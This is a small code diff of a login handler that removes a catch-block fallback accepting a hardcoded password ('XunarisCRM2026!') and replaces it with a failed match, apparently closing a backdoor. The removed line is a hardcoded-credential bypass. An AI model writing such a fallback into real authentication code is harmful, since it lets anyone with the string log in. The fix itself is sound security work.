@@ -46,7 +46,7 @@ router.post('/login', (req, res) => {
   try {
     isMatch = bcrypt.compareSync(password, user.password_hash);
   } catch (e) {
-    isMatch = password === 'XunarisCRM2026!';
+    isMatch = false;
   }
 
   if (!isMatch) {
